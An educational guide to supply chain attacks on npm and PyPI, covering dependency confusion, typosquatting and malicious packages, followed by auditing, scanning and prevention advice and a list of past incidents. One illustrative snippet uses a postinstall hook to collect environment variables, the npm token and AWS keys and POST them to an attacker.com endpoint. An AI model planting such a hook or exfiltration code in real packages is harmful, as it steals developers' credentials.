# Supply Chain Attacks

## Introduction

This document provides a brief introduction to supply chain attacks, particularly focusing on package repositories like npm and PyPI. **Note:** This is an advanced security topic that involves understanding software dependencies, package management systems, and attack vectors that target the software development lifecycle. Supply chain attacks have become increasingly prevalent and sophisticated, making them a critical concern for modern software development.

## What is a Supply Chain Attack?

A **supply chain attack** (also called a **dependency attack** or **third-party attack**) is a cyberattack that targets an organization by compromising elements of its supply chain—typically third-party software, libraries, or services that the organization uses.

**Simple Analogy:** Like a contaminated ingredient in a restaurant's supply chain that affects all dishes, a malicious package in your software dependencies can compromise your entire application.

Instead of attacking a target directly, attackers compromise:
- Third-party libraries and packages
- Development tools and build systems
- Software updates and distribution channels
- Vendor software and services

## How Supply Chain Attacks Work?

Supply chain attacks exploit the trust relationship between developers and package repositories:

```
┌─────────────────────────────────────────────────────────┐
│         Developer Creates Application                   │
│    (Uses packages from npm, PyPI, etc.)                 │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│    Developer Installs Dependencies                      │
│    npm install express  OR  pip install requests        │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│    Package Repository (npm, PyPI, etc.)                 │
│    ┌─────────────────────────────────────┐              │
│    │  Legitimate Package                 │              │
│    │  express@4.18.0                     │              │
│    └─────────────────────────────────────┘              │
│    ┌─────────────────────────────────────┐              │
│    │  Malicious Package (Attacker)        │              │
│    │  express@4.18.1 (typosquatting)      │              │
│    │  OR                                  │              │
│    │  @company/express (dependency        │              │
│    │   confusion)                         │              │
│    └─────────────────────────────────────┘              │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│    Malicious Code Executes During:                      │
│    - Installation (postinstall scripts)                 │
│    - Runtime (when package is imported)                 │
│    - Build time (preinstall scripts)                   │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│    Attacker Gains:                                       │
│    - Access to source code                               │
│    - Credentials and secrets                            │
│    - Ability to modify/deploy code                       │
│    - Access to internal systems                          │
└─────────────────────────────────────────────────────────┘
```

**Attack Flow:**
1. Attacker publishes malicious package to public repository
2. Developer (or automated system) installs the package
3. Malicious code executes during installation or runtime
4. Attacker gains unauthorized access or exfiltrates data

## Types of Supply Chain Attacks

### 1. Dependency Confusion Attacks

**What it is:** Attackers publish malicious packages with names that match internal/private packages used by organizations.

**How it works:**
- Organization uses internal package: `@company/express`
- Attacker publishes public package: `@company/express` to npm
- Package manager resolves to public version (higher version number)
- Malicious code executes instead of legitimate internal package

**Example:**
```bash
# Internal package (private registry)
@company/utils@1.0.0

# Attacker publishes to npm
@company/utils@999.0.0  # Higher version number

# npm install resolves to public version
npm install @company/utils  # Installs malicious version!
```

**Real-world impact:** In 2021, a security researcher demonstrated this by publishing packages that matched internal Microsoft packages, gaining access to Microsoft's build systems.

### 2. Typosquatting in Package Repositories

**What it is:** Attackers publish packages with names similar to popular packages, hoping developers will mistype and install the malicious version.

**How it works:**
- Popular package: `express`
- Malicious packages: `expresss`, `expreess`, `express-utils`, `expressjs`
- Developer makes typo: `npm install expresss`
- Malicious package is installed

**Examples of Typosquatting:**
```bash
# Legitimate packages
npm install express
npm install lodash
npm install axios

# Typosquatting attempts
npm install expresss      # Extra 's'
npm install lodahs       # Swapped letters
npm install axois         # Swapped letters
npm install express-utils # Legitimate-sounding name
```

**Real-world example:** In 2017, a malicious package `crossenv` (typo of `cross-env`) was downloaded over 2 million times before being removed.

### 3. Malicious npm/PyPI Packages

**What it is:** Packages that appear legitimate but contain malicious code that executes during installation or runtime.

**Common techniques:**
- **Postinstall scripts**: Code that runs automatically after installation
- **Preinstall scripts**: Code that runs before installation
- **Obfuscated code**: Malicious code hidden in legitimate-looking functions
- **Credential theft**: Stealing environment variables, API keys, or tokens
- **Backdoors**: Creating persistent access to compromised systems

**Example malicious package structure:**
```json
{
  "name": "legitimate-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node steal-credentials.js"
  }
}
```

**What the malicious script might do:**
```javascript
// steal-credentials.js
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  npm_token: process.env.NPM_TOKEN,
  aws_key: process.env.AWS_ACCESS_KEY_ID
});

https.request('https://attacker.com/steal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'}
}).end(data);
```

## Detection and Prevention

### Detection Techniques

#### 1. Package Auditing Tools

**npm:**
```bash
# Audit installed packages
npm audit

# Fix vulnerabilities automatically
npm audit fix

# Check for known vulnerabilities
npm audit --audit-level=moderate
```

**Python (pip):**
```bash
# Check for vulnerabilities
pip-audit

# Or use safety
safety check
```

#### 2. Dependency Scanning

**Tools:**
- **Snyk**: Scans dependencies for vulnerabilities
- **WhiteSource/Revenera**: Open source security management
- **GitHub Dependabot**: Automated dependency updates and alerts
- **OWASP Dependency-Check**: Identifies project dependencies with known vulnerabilities

**Example with Snyk:**
```bash
# Install Snyk
npm install -g snyk

# Test your project
snyk test

# Monitor continuously
snyk monitor
```

#### 3. Package Lock Files

Always commit `package-lock.json` (npm) or `requirements.txt` with pinned versions (Python):

```json
// package-lock.json ensures exact versions
{
  "express": {
    "version": "4.18.2",
    "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
    "integrity": "sha512-5/PsL6iGPdfQ/lKM1UuielYgv3BUoJfz1aUwU9vHZ+J7gyvwdQXFEBIEIaxeGf0GIcreATNyBExtalisDbuMqQ=="
  }
}
```

#### 4. Code Review and Analysis

- Review all dependencies before adding them
- Check package maintainer reputation
- Review package source code on GitHub
- Check download statistics and community activity
- Verify package signatures (if available)

### Prevention Strategies

#### 1. Use Private Package Registries

**npm:**
```bash
# Configure .npmrc for private registry
registry=https://npm.company.com
@company:registry=https://npm.company.com
```

**Python:**
```bash
# Use private PyPI server
pip install --index-url https://pypi.company.com/simple package-name
```

#### 2. Implement Package Allowlisting

Only allow installation of approved packages:

```json
// .npmrc or package.json policies
{
  "allowedPackages": [
    "express@^4.18.0",
    "lodash@^4.17.21"
  ]
}
```

#### 3. Use Package Lock Files

- Always commit `package-lock.json` or `yarn.lock`
- Use `npm ci` instead of `npm install` in CI/CD (uses lock file exactly)
- Pin versions in `requirements.txt` for Python

#### 4. Enable Two-Factor Authentication

- Enable 2FA on npm/PyPI accounts
- Use organization-level 2FA requirements
- Protect maintainer accounts

#### 5. Monitor and Alert

**Set up alerts for:**
- New dependencies added to projects
- Unusual package installations
- Postinstall script executions
- Network connections from build processes

**Example monitoring script:**
```bash
#!/bin/bash
# Monitor npm installs
npm install 2>&1 | tee install.log
if grep -q "postinstall" install.log; then
  echo "WARNING: Postinstall script detected!"
  # Send alert
fi
```

#### 6. Use Least Privilege

- Run build processes with minimal permissions
- Use separate CI/CD accounts with limited access
- Don't store secrets in environment variables accessible to packages
- Use secret management tools (HashiCorp Vault, AWS Secrets Manager)

#### 7. Regular Updates and Patching

- Regularly update dependencies
- Monitor security advisories
- Use automated dependency update tools (Dependabot, Renovate)
- Test updates in staging before production

## Real-World Examples

### 1. EventStream (2018)
- **What happened**: Malicious code added to popular `event-stream` package
- **Impact**: 2 million+ downloads, stole Bitcoin wallet credentials
- **Lesson**: Even trusted maintainers can be compromised

### 2. ua-parser-js (2021)
- **What happened**: Maintainer account compromised, malicious versions published
- **Impact**: Cryptocurrency mining and credential theft
- **Lesson**: Protect maintainer accounts with 2FA

### 3. colors and faker (2022)
- **What happened**: Maintainer intentionally added infinite loop in protest
- **Impact**: Thousands of applications broken
- **Lesson**: Dependencies can be weaponized by maintainers

### 4. Dependency Confusion (2021)
- **What happened**: Researcher demonstrated dependency confusion against major tech companies
- **Impact**: Access to internal build systems
- **Lesson**: Private packages need proper registry configuration

## Best Practices Checklist

- [ ] Use package lock files and commit them to version control
- [ ] Regularly audit dependencies (`npm audit`, `pip-audit`)
- [ ] Use private registries for internal packages
- [ ] Enable 2FA on package repository accounts
- [ ] Review all new dependencies before adding
- [ ] Pin dependency versions (avoid `^` and `~` in production)
- [ ] Use automated dependency scanning tools
- [ ] Monitor for suspicious package behavior
- [ ] Implement least privilege for build processes
- [ ] Keep dependencies updated and patch vulnerabilities promptly
- [ ] Use separate accounts for CI/CD with limited permissions
- [ ] Verify package integrity (checksums, signatures)

## Conclusion

Supply chain attacks represent a significant and growing threat to modern software development. By compromising trusted packages and dependencies, attackers can gain access to thousands of applications and organizations simultaneously.

Key takeaways:
- **Trust but verify**: Even popular packages can be compromised
- **Monitor continuously**: Use automated tools to detect vulnerabilities
- **Limit exposure**: Use private registries and package allowlisting
- **Stay informed**: Follow security advisories and update regularly
- **Defense in depth**: Combine multiple security measures

As the software supply chain becomes more complex, organizations must implement comprehensive security measures to protect against these sophisticated attacks.

---

**Important Note**: The information in this document is provided for educational and defensive security purposes. Always follow responsible disclosure practices when researching vulnerabilities.

